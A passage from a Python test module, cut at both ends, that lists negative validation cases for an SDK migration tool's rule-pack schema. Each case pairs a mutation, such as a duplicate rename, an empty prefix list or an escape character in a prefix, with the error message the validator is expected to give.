        mutate=flagged_twice({}, {"symbols": ["demo_legacy.protos.Message"]}),
    ),
    Case(
        name="two_flag_only_changes_on_one_attribute",
        defect="an attribute two rules report, so each row has two messages",
        path="",
        says="both flag ['demo_legacy.Reply.text']",
        extra=FLAG_CHANGE,
        mutate=flagged_twice(
            {"attributes": ["demo_legacy.Reply.text"]},
            {"attributes": ["demo_legacy.Reply.text"]},
        ),
    ),
    Case(
        name="two_flag_only_changes_on_shapes_with_one_reason",
        defect="two shape ids that report one reason, so each row has two messages",
        path="",
        says="both flag ['dynamic_access']",
        extra=FLAG_CHANGE,
        mutate=flagged_twice({"patterns": ["dynamic_access"]}, {"patterns": ["sys_modules_stub"]}),
    ),
    Case(
        name="a_variable_named_where_no_shape_reports_a_write",
        defect="environment variables on a rule that does not report a write of one",
        path=f"{EXTRA}.params",
        says="variables and the environment_write pattern are named together",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "variables", ["DEMO_LEGACY_BASE"]),
    ),
    Case(
        name="an_environment_write_shape_with_no_variable",
        defect="a shape that reports a write of a variable, and no variable named",
        path=f"{EXTRA}.params",
        says="variables and the environment_write pattern are named together",
        extra=FLAG_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "patterns", ["environment_write"]),
    ),
    Case(
        name="a_variable_no_prefilter_token_occurs_in",
        defect="a variable a file may set that no prefilter token finds, so the file is never read",
        path="",
        says="in which no match.prefilter_tokens entry occurs",
        extra=FLAG_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update(
            patterns=["environment_write"], variables=["DEMO_BASE"]
        ),
    ),
    Case(
        name="an_attribute_of_a_module_the_pack_does_not_match",
        defect="an attribute path under no module in match.imports, in a shared pack too",
        path="",
        says="under nothing in match.imports",
        extra=FLAG_CHANGE,
        mutate=_attribute_outside,
    ),
    Case(
        name="manifest_names_a_third_distribution",
        defect="a dependency rule pinning a distribution this pack does not migrate",
        path="",
        says="is not this migration",
        extra=MANIFEST_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "to_name", "something-else"),
    ),
    Case(
        name="declare_transitive_with_no_module_listed",
        defect="a dependency rule that declares what the legacy distribution installed, where the "
        "pack lists none",
        path="",
        says="declares what match.transitive lists, and this pack lists none",
        extra=MANIFEST_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "declare_transitive", True),
    ),
    Case(
        name="method_returns_names_no_such_method",
        defect="a return recorded for a method the rule does not support",
        path=f"{EXTRA}.params",
        says="is not a supported method",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.rewind": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="method_returns_a_receiver_with_no_methods",
        defect="a receiver the scanner could hold and do nothing with",
        path=f"{EXTRA}.params",
        says="has no method list",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.generate": "demo_legacy.Session"},
        ),
    ),
    Case(
        name="method_returns_its_own_receiver",
        defect="an entry that says a method hands back the object it was called on",
        path=f"{EXTRA}.params",
        says="needs no entry",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "method_returns",
            {"demo_legacy.Model.generate": "demo_legacy.Model"},
        ),
    ),
    Case(
        name="a_receiver_nothing_can_produce",
        defect="a receiver with methods, no constructor and no method that returns it",
        path=f"{EXTRA}.params",
        says="nothing in this pack produces",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "methods",
            {"demo_legacy.Model": ["generate"], "demo_legacy.Session": ["ask"]},
        ),
    ),
    # What the constructor and its calls must add up to.
    Case(
        name="a_constructor_with_no_parameters",
        defect="a legacy signature with nothing in it, which no call can match",
        path=f"{EXTRA}.params",
        says="a constructor has parameters",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_order", []),
    ),
    Case(
        name="ctor_kwarg_outside_the_signature",
        defect="a destination for a constructor parameter the signature does not have",
        path=f"{EXTRA}.params",
        says="which is not a parameter in ctor_order",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_model_kwarg", "model_name"),
    ),
    Case(
        name="ctor_kwarg_placed_twice",
        defect="one constructor parameter given two destinations",
        path=f"{EXTRA}.params",
        says="a constructor parameter has one destination or none",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_config_fields", ["settings"]),
    ),
    Case(
        name="ctor_order_repeats_a_parameter",
        defect="a signature that names one parameter twice",
        path=f"{EXTRA}.params",
        says="must not repeat an entry",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "ctor_order", ["name", "name"]),
    ),
    Case(
        name="a_rewrite_for_no_supported_method",
        defect="a rewrite for a method no receiver declares, which nothing can reach",
        path=f"{EXTRA}.params",
        says="which is not a supported method of any receiver",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.stream": {"new_call": "models.stream"}},
        ),
    ),
    Case(
        name="a_stream_call_that_is_the_same_method",
        defect="a streaming target identical to the plain one, which loses the keyword",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="makes the stream keyword disappear silently",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "stream_call": "models.generate",
                }
            },
        ),
    ),
    Case(
        name="semantic_kwargs_on_a_call_that_carries_config",
        defect="constructor keywords that may not be dropped, on a call that drops nothing",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="one of the two is wrong",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "config_kwarg": "config",
                    "semantic_kwargs": ["settings"],
                }
            },
        ),
    ),
    Case(
        name="the_configuration_class_claimed_twice",
        defect="the claimed configuration spelling repeated as an alias another rule owns",
        path=f"{EXTRA}.params",
        says="one symbol has one rule that rewrites it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "legacy_config_aliases", ["demo_legacy.Config"]
        ),
    ),
    Case(
        name="a_response_attribute_with_no_exception",
        defect="half of the response shape, which is not recognisable from one end",
        path=f"{EXTRA}.params",
        says="response_attrs_now_none and response_legacy_error are one fact",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "response_attrs_now_none", ["text"]),
    ),
    # What the chat surface and the async methods must add up to.
    Case(
        name="a_history_keyword_with_no_shape",
        defect="a value that is rewritten, with nothing saying into what",
        path=f"{EXTRA}.params",
        says="and nothing says into what",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "history_kwarg": "history",
                }
            },
        ),
    ),
    Case(
        name="a_history_role_table_with_one_key_twice",
        defect="one key of a history entry named as both halves of it",
        path=f"{EXTRA}.params.history",
        says="two keys of one entry, not one",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "history",
            {"role_key": "role", "parts_key": "role", "text_key": "text", "roles": ["user"]},
        ),
    ),
    Case(
        name="a_client_call_that_names_no_service",
        defect="a call rooted on the client with nothing between it and the method",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="names a service and a method on it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.generate": {"new_call": "generate"}},
        ),
    ),
    Case(
        name="a_receiver_call_that_names_a_service",
        defect="a path off an object that has no such attribute",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="names a method of that object and nothing in front of it",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "root": "receiver",
                    "new_call": "models.generate",
                }
            },
        ),
    ),
    Case(
        name="a_rename_for_an_argument_the_call_cannot_take",
        defect="a keyword rename no call can reach",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="no call can reach the rename",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["contents"],
                    "arg_map": {"prompt": "contents"},
                }
            },
        ),
    ),
    Case(
        name="two_legacy_keywords_renamed_onto_one",
        defect="two arguments mapped onto one, so one of them is lost",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="maps two legacy keywords onto one new one",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["content", "prompt"],
                    "arg_map": {"content": "contents", "prompt": "contents"},
                }
            },
        ),
    ),
    Case(
        name="a_new_call_that_is_not_a_dotted_path",
        defect="a call target that is an expression rather than a name",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate.new_call",
        says="expected a dotted path under the client",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {"demo_legacy.Model.generate": {"new_call": "models.generate()"}},
        ),
    ),
    Case(
        name="a_history_keyword_that_is_also_carried",
        defect="one keyword both reshaped and moved, which the rule order would decide",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="which another field already claims",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["history"],
                    "history_kwarg": "history",
                }
            },
        ),
    ),
    Case(
        name="a_refused_keyword_that_is_also_carried",
        defect="one keyword both refused and moved, which the rule order would decide",
        path=f"{EXTRA}.params.rewrites.demo_legacy.Model.generate",
        says="is refused or it is carried, not both",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "rewrites",
            {
                "demo_legacy.Model.generate": {
                    "new_call": "models.generate",
                    "positional_to_kw": ["tools"],
                    "afc_kwargs": ["tools"],
                }
            },
        ),
    ),
    Case(
        name="an_empty_model_name_prefix",
        defect="a prefix every literal has, so every edit would carry the warning",
        path=f"{EXTRA}.params",
        says="an empty one is a prefix every literal has",
        extra=MODEL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "model_name_prefix", ""),
    ),
    # Documents that are not a pack at all.
    Case(
        name="duplicate_yaml_key",
        defect="one key twice, which YAML resolves by discarding the first",
        path="",
        says="duplicate key 'provider'",
        text="__DUPLICATE__",
    ),
    # rewrite_call: the parameter lists must agree with each other.
    Case(
        name="a_config_class_with_no_keyword_to_pass_it_under",
        defect="a configuration class the emitted call has no name for",
        path=f"{EXTRA}.params",
        says="config_class, config_kwargs and config_kwarg go together",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].pop("config_kwarg"),
    ),
    Case(
        name="a_parameter_that_is_an_argument_and_a_config_field",
        defect="a parameter named in both destinations, so the rule's order decides",
        path=f"{EXTRA}.params",
        says="is in positional_to_kw and in config_kwargs",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "config_kwargs", ["body", "depth"]),
    ),
    Case(
        name="a_renamed_parameter_no_list_names",
        defect="an arg_map row for a parameter the rule never reads",
        path=f"{EXTRA}.params",
        says="arg_map renames ['weight']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["arg_map"].update({"weight": "mass"}),
    ),
    Case(
        name="two_parameters_that_land_on_one_keyword",
        defect="a rename onto a name another parameter already carries",
        path=f"{EXTRA}.params",
        says="land on ['kind'] once arg_map is applied",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["arg_map"].update({"body": "kind"}),
    ),
    Case(
        name="an_alias_for_a_parameter_no_list_names",
        defect="another name for a parameter the rule never reads, so it would carry nothing",
        path=f"{EXTRA}.params",
        says="aliases stand for ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update({"aliases": {"label": "flavour"}}),
    ),
    Case(
        name="an_alias_that_is_also_a_parameter",
        defect="a keyword that is a parameter and another name for one",
        path=f"{EXTRA}.params",
        says="['body'] is an alias and a parameter the rule reads too",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update({"aliases": {"body": "kind"}}),
    ),
    Case(
        name="a_number_only_parameter_no_list_names",
        defect="a list of numbers the rule would never consult",
        path=f"{EXTRA}.params",
        says="positive_numbers names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update({"positive_numbers": ["flavour"]}),
    ),
    Case(
        name="a_number_only_parameter_with_a_value_map",
        defect="a parameter that must be a number and a string in a table, so no value passes",
        path=f"{EXTRA}.params",
        says="['kind'] is in positive_numbers and has a value_maps table",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update(
            {"positive_numbers": ["kind"], "value_maps": {"kind": {"a": "A"}}}
        ),
    ),
    Case(
        name="a_dispatch_prefix_on_a_parameter_no_list_names",
        defect="a prefix list the rule would never consult",
        path=f"{EXTRA}.params",
        says="dispatch_prefixes names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"]["dispatch_prefixes"].update(
            {"flavour": ["kinds/"]}
        ),
    ),
    Case(
        name="a_dispatch_prefix_list_with_nothing_in_it",
        defect="a prefix list that refuses every call rather than naming one that carries",
        path=f"{EXTRA}.params",
        says="is empty, which refuses every call",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "dispatch_prefixes", {"kind": []}),
    ),
    Case(
        name="a_literal_prefix_on_a_parameter_no_list_names",
        defect="a prefix list the rule would never consult",
        path=f"{EXTRA}.params",
        says="literal_prefixes names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update(
            {"literal_prefixes": {"flavour": ["a/"]}}
        ),
    ),
    Case(
        name="a_literal_prefix_list_with_nothing_in_it",
        defect="a prefix list that refuses every value written out, naming none that carries",
        path=f"{EXTRA}.params",
        says="literal_prefixes['body'] is empty",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "literal_prefixes", {"body": []}),
    ),
    Case(
        name="a_parameter_both_dispatched_and_literal",
        defect="a parameter that must be a listed literal and one that carries unless it is not",
        path=f"{EXTRA}.params",
        says="['kind'] is in dispatch_prefixes and in literal_prefixes",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update({"literal_prefixes": {"kind": ["a/"]}}),
    ),
    Case(
        name="a_value_map_on_a_parameter_no_list_names",
        defect="a table of spellings the rule would never consult",
        path=f"{EXTRA}.params",
        says="value_maps names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update({"value_maps": {"flavour": {"a": "A"}}}),
    ),
    Case(
        name="a_value_map_with_nothing_in_it",
        defect="a table that refuses every call rather than saying which values carry",
        path=f"{EXTRA}.params",
        says="value_maps['kind'] is empty",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "value_maps", {"kind": {}}),
    ),
    Case(
        name="a_warning_list_that_is_not_sorted",
        defect="a warning list with two spellings of one set",
        path=f"{EXTRA}.params",
        says="warnings must be sorted and de-duplicated",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "warnings",
            ["upload_display_name_unset", "response_text_may_be_none"],
        ),
    ),
    Case(
        name="a_warning_that_is_always_and_unless",
        defect="a warning both carried by every call and withheld by one that passes a parameter",
        path=f"{EXTRA}.params",
        says="is in warnings and in warnings_unless",
        extra=CALL_CHANGE,
        mutate=lambda d: d["changes"][1]["params"].update(
            {
                "warnings": ["upload_display_name_unset"],
                "warnings_unless": {"upload_display_name_unset": "kind"},
            }
        ),
    ),
    Case(
        name="a_conditional_warning_on_a_parameter_no_list_names",
        defect="a warning no call could ever be rid of",
        path=f"{EXTRA}.params",
        says="warnings_unless names ['flavour']",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"],
            "warnings_unless",
            {"upload_display_name_unset": "flavour"},
        ),
    ),
    Case(
        name="a_warning_nothing_defines",
        defect="a warning code no report could explain",
        path=f"{EXTRA}.params.warnings[0]",
        says="Input should be",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "warnings", ["be_careful"]),
    ),
    Case(
        name="a_dispatch_prefix_list_that_is_not_sorted",
        defect="a prefix list with two spellings of one set",
        path=f"{EXTRA}.params",
        says="must be sorted and de-duplicated",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "dispatch_prefixes", {"kind": ["kinds/", "flavours/"]}
        ),
    ),
    Case(
        name="an_empty_dispatch_prefix",
        defect="a prefix every string begins with",
        path=f"{EXTRA}.params.dispatch_prefixes.kind[0]",
        says="must not be empty",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(d["changes"][1]["params"], "dispatch_prefixes", {"kind": [""]}),
    ),
    Case(
        name="a_dispatch_prefix_with_a_control_character",
        defect="a prefix carrying bytes a terminal would act on",
        path=f"{EXTRA}.params.dispatch_prefixes.kind[0]",
        says="the literal start of an argument",
        extra=CALL_CHANGE,
        mutate=lambda d: _with(
            d["changes"][1]["params"], "dispatch_prefixes", {"kind": ["kinds/\x1b[2K"]}
        ),
    ),
    # A module the new SDK keeps: only the listed names are legacy, and no import is renamed.
    Case(
        name="a_shared_module_with_no_legacy_names",
        defect="a shared module that lists nothing legacy, so nothing in it could be a finding",
        path="match",
        says="a shared module has no legacy surface until symbols names it",
        mutate=lambda d: _with(d["match"], "shared", True),
    ),
    Case(
        name="a_rename_in_a_shared_module",
        defect="an import rewrite for a module the new SDK keeps under the same name",
        path="",
        says="renames a module that match.shared says the new SDK keeps",
        extra=RENAME_CHANGE,
        mutate=_shared,
    ),
    Case(
        name="a_rule_outside_the_listed_legacy_names",
        defect="a rule on a name the module's own imports reach but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
        extra=MODULE_CALL,
        mutate=_shared,
    ),
    # rename_setting: a shared module's attribute, and what the new name needs of a value.
    Case(
        name="a_rename_setting_with_no_setting",
        defect="a rule that renames nothing",
        path=f"{EXTRA}.params",
        says="a rename_setting rule must name a setting",
        extra=SETTING_CHANGE,
        mutate=_setting(settings={}),
    ),
    Case(
        name="a_setting_that_is_no_attribute_of_a_module",
        defect="a setting named without the module it is an attribute of",
        path=f"{EXTRA}.params",
        says="names an attribute of a module, so it is a dotted path",
        extra=SETTING_CHANGE,
        mutate=_setting(settings={"endpoint": "address"}),
    ),
    Case(
        name="a_setting_that_keeps_its_name",
        defect="a rename onto the name the setting already has",
        path=f"{EXTRA}.params",
        says="keeps its name, so there is nothing to rename",
        extra=SETTING_CHANGE,
        mutate=_setting(settings={"demo_legacy.endpoint": "endpoint"}),
    ),
    Case(
        name="a_setting_renamed_onto_another_setting",
        defect="a rename whose result the same rule renames again",
        path=f"{EXTRA}.params",
        says="which settings renames again",
        extra=SETTING_CHANGE,
        mutate=_setting(
            symbols=["demo_legacy.address", "demo_legacy.configure", "demo_legacy.endpoint"],
            settings={"demo_legacy.address": "place", "demo_legacy.endpoint": "address"},
        ),
    ),
    Case(
        name="a_trailing_character_that_is_a_quote",
        defect="a character that would end the string literal it is written into",
        path=f"{EXTRA}.params.value_ends_with",
        says="not a quote, a backslash or a digit",
        extra=SETTING_CHANGE,
        mutate=_setting(value_ends_with='"'),
    ),
    Case(
        name="a_trailing_character_that_is_a_digit",
        defect="a digit, which would join the octal escape a literal may end with",
        path=f"{EXTRA}.params.value_ends_with",
        says="not a quote, a backslash or a digit",
        extra=SETTING_CHANGE,
        mutate=_setting(value_ends_with="1"),
    ),
    Case(
        name="a_setting_renamed_onto_a_keyword",
        defect="a new name that no attribute access can spell",
        path=f"{EXTRA}.params.settings.demo_legacy.endpoint",
        says="not a keyword",
        extra=SETTING_CHANGE,
        mutate=_setting(settings={"demo_legacy.endpoint": "class"}),
    ),
    Case(
        name="a_trailing_character_of_two",
        defect="an ending of more than one character, which `rstrip` would take as a set",
        path=f"{EXTRA}.params.value_ends_with",
        says="one visible ASCII character",
        extra=SETTING_CHANGE,
        mutate=_setting(value_ends_with="/v"),
    ),
    Case(
        name="a_setting_in_a_module_that_moves",
        defect="a renamed setting in a pack whose module is renamed too",
        path="",
        says="renames a setting and keeps its module",
        extra=SETTING_CHANGE,
    ),
    Case(
        name="a_setting_outside_the_listed_legacy_names",
        defect="a setting the module's own imports reach but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
        extra=SETTING_CHANGE,
        mutate=_shared,
    ),
    Case(
        name="a_setting_renamed_onto_a_legacy_name",
        defect="a rename that lands on a name `symbols` lists, so the result is found again",
        path="",
        says="which match.symbols lists as legacy",
        extra=SETTING_CHANGE,
        mutate=_setting(
            symbols=["demo_legacy.address", "demo_legacy.configure", "demo_legacy.endpoint"]
        ),
    ),
    Case(
        name="two_changes_that_claim_one_setting",
        defect="two rules on one setting, so the order of the list would pick",
        path="",
        says="two changes claim 'demo_legacy.endpoint'",
        extra=SETTING_CHANGE,
        mutate=_setting(more=({**SETTING_CHANGE, "id": "endpoint-again"},)),
    ),
    Case(
        name="a_setting_both_renamed_and_refused",
        defect="a setting one rule renames and another reports",
        path="",
        says="is both rewritten and refused",
        extra=SETTING_CHANGE,
        mutate=_setting(
            more=(
                {
                    **FLAG_CHANGE,
                    "id": "flag-endpoint",
                    "params": {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.endpoint"]},
                },
            )
        ),
    ),
    # rename_symbol: a name a kept package's submodule defined, exported from the package now.
    Case(
        name="a_rename_symbol_with_no_symbol",
        defect="a rule that renames nothing",
        path=f"{EXTRA}.params",
        says="a rename_symbol rule must name a symbol",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(symbols={}),
    ),
    Case(
        name="a_symbol_that_is_no_member_of_a_submodule",
        defect="a symbol with no submodule to leave, which is a rename of the package's own name",
        path=f"{EXTRA}.params",
        says="names a member of a submodule, so it is a path of three names or more",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(symbols={"demo_legacy.Busy": "Fault"}),
    ),
    Case(
        name="two_symbols_renamed_onto_one_name",
        defect="two classes that would be one name in the package",
        path=f"{EXTRA}.params",
        says="are both renamed onto 'demo_legacy.Fault'",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(
            symbols={"demo_legacy.errors.Busy": "Fault", "demo_legacy.errors.Denied": "Fault"}
        ),
    ),
    Case(
        name="a_symbol_renamed_onto_a_keyword",
        defect="a new name that no attribute access can spell",
        path=f"{EXTRA}.params.symbols.demo_legacy.errors.Busy",
        says="not a keyword",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(symbols={"demo_legacy.errors.Busy": "class"}),
    ),
    Case(
        name="bases_that_are_not_sorted",
        defect="a list with two spellings, so the pack's hash would hide that it is one list",
        path=f"{EXTRA}.params",
        says="now_caught_by must be sorted and de-duplicated",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(now_caught_by=["demo_legacy.Fault", "demo_legacy.Base"]),
    ),
    Case(
        name="a_symbol_in_a_package_that_moves",
        defect="a renamed symbol in a pack whose package is renamed too",
        path="",
        says="renames a symbol and keeps its package",
        extra=SYMBOL_CHANGE,
    ),
    Case(
        name="a_symbol_outside_the_listed_legacy_names",
        defect="a symbol the package's own imports reach but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
        extra=SYMBOL_CHANGE,
        mutate=_shared,
    ),
    Case(
        name="a_symbol_renamed_onto_a_legacy_name",
        defect="a rename that lands on a name `symbols` lists, so the result is found again",
        path="",
        says="which match.symbols lists as legacy",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(legacy=["demo_legacy.Busy", "demo_legacy.configure", "demo_legacy.errors"]),
    ),
    Case(
        name="two_changes_that_claim_one_symbol",
        defect="two rules on one symbol, so the order of the list would pick",
        path="",
        says="two changes claim 'demo_legacy.errors.Busy'",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(more=({**SYMBOL_CHANGE, "id": "errors-again"},)),
    ),
    Case(
        name="a_symbol_both_renamed_and_refused",
        defect="a symbol one rule renames and another reports",
        path="",
        says="is both rewritten and refused",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(
            more=(
                {
                    **FLAG_CHANGE,
                    "id": "flag-busy",
                    "params": {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.errors.Busy"]},
                },
            )
        ),
    ),
    Case(
        name="a_symbol_under_a_refused_prefix",
        defect="a symbol under one a flag_only rule reports, which the scan grades first",
        path="",
        says="is under a symbol a flag_only rule refuses",
        extra=SYMBOL_CHANGE,
        mutate=_symbol(
            more=(
                {
                    **FLAG_CHANGE,
                    "id": "flag-errors",
                    "params": {**FLAG_CHANGE["params"], "symbols": ["demo_legacy.errors"]},
                },
            )
        ),
    ),
    # rename_symbol, a name that stays in its module and takes another spelling.
    Case(
        name="a_renamed_name_with_no_module",
        defect="a name with no module to stay in, which is a rename of the package itself",
        path=f"{EXTRA}.params",
        says="renamed names a member of a module, so it is a path of two names or more",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(renamed={"old": "new"}),
    ),
    Case(
        name="a_renamed_name_that_keeps_its_name",
        defect="a rename onto the name it has, which changes nothing",
        path=f"{EXTRA}.params",
        says="takes the name it has; there is nothing to rename",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(renamed={"demo_legacy.old": "old"}),
    ),
    Case(
        name="a_name_both_moved_and_renamed",
        defect="a name that leaves its submodule and stays in its module at once",
        path=f"{EXTRA}.params",
        says="is in symbols and in renamed; it moves or it is renamed",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(
            symbols={"demo_legacy.errors.Busy": "Busy"},
            renamed={"demo_legacy.errors.Busy": "Fault"},
        ),
    ),
    Case(
        name="two_names_renamed_onto_one",
        defect="two names that would be one in the module",
        path=f"{EXTRA}.params",
        says="are both renamed onto 'demo_legacy.new'",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(renamed={"demo_legacy.old": "new", "demo_legacy.older": "new"}),
    ),
    Case(
        name="a_name_renamed_onto_a_listed_legacy_name",
        defect="a rename that lands on a name `symbols` lists, so the result is found again",
        path="",
        says="which match.symbols lists as legacy",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(
            legacy=["demo_legacy.configure", "demo_legacy.new", "demo_legacy.old"],
            renamed={"demo_legacy.old": "new"},
        ),
    ),
    Case(
        name="a_renamed_name_outside_the_listed_legacy_names",
        defect="a renamed name the package's imports reach but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(legacy=["demo_legacy.configure"], renamed={"demo_legacy.old": "new"}),
    ),
    Case(
        name="two_changes_that_claim_one_renamed_name",
        defect="two rules on one name, so the order of the list would pick",
        path="",
        says="two changes claim 'demo_legacy.old'",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(
            renamed={"demo_legacy.old": "new"},
            more=(
                {
                    **SYMBOL_CHANGE,
                    "id": "again",
                    "params": {"renamed": {"demo_legacy.old": "newer"}},
                },
            ),
        ),
    ),
    Case(
        name="calls_that_are_neither_refused_nor_allowed",
        defect="a switch with a third position nothing reads",
        path=f"{EXTRA}.params.calls",
        says="Input should be 'refused' or 'allowed'",
        extra=SYMBOL_CHANGE,
        mutate=_renamed(renamed={"demo_legacy.old": "new"}, calls="sometimes"),
    ),
    # rename_member: a method of a class, on the instances of it and of what derives from it.
    Case(
        name="a_rename_member_with_no_member",
        defect="a rule that renames nothing",
        path=f"{EXTRA}.params",
        says="a rename_member rule must name a member",
        extra=MEMBER_CHANGE,
        mutate=_member(members={}),
    ),
    Case(
        name="a_member_with_no_class",
        defect="a member of a module, which is a rename of a name and not of a member",
        path=f"{EXTRA}.params",
        says="names a member of a class, so it is a path of three names or more",
        extra=MEMBER_CHANGE,
        mutate=_member(members={"demo_legacy.old": "new"}),
    ),
    Case(
        name="a_member_that_keeps_its_name",
        defect="a rename onto the name it has, which changes nothing",
        path=f"{EXTRA}.params",
        says="takes the name it has; there is nothing to rename",
        extra=MEMBER_CHANGE,
        mutate=_member(members={"demo_legacy.Model.old": "old"}),
    ),
    Case(
        name="a_member_renamed_again",
        defect="a name that is a rename's target and another's key, so the result is read again",
        path=f"{EXTRA}.params",
        says="is renamed onto 'new', which members renames again",
        extra=MEMBER_CHANGE,
        mutate=_member(members={"demo_legacy.Model.old": "new", "demo_legacy.Model.new": "newer"}),
    ),
    Case(
        name="two_members_renamed_onto_one",
        defect="two methods that would be one name on the class",
        path=f"{EXTRA}.params",
        says="are both renamed onto 'demo_legacy.Model.new'",
        extra=MEMBER_CHANGE,
        mutate=_member(members={"demo_legacy.Model.old": "new", "demo_legacy.Model.older": "new"}),
    ),
    Case(
        name="a_member_renamed_onto_a_listed_legacy_name",
        defect="a rename that lands on a name `symbols` lists, so the result is found again",
        path="",
        says="which match.symbols lists as legacy",
        extra=MEMBER_CHANGE,
        mutate=_member(
            legacy=["demo_legacy.Model.new", "demo_legacy.Model.old", "demo_legacy.configure"],
            members={"demo_legacy.Model.old": "new"},
        ),
    ),
    Case(
        name="a_member_outside_the_listed_legacy_names",
        defect="a member the module's name reaches but `symbols` does not list",
        path="",
        says="under nothing in match.symbols",
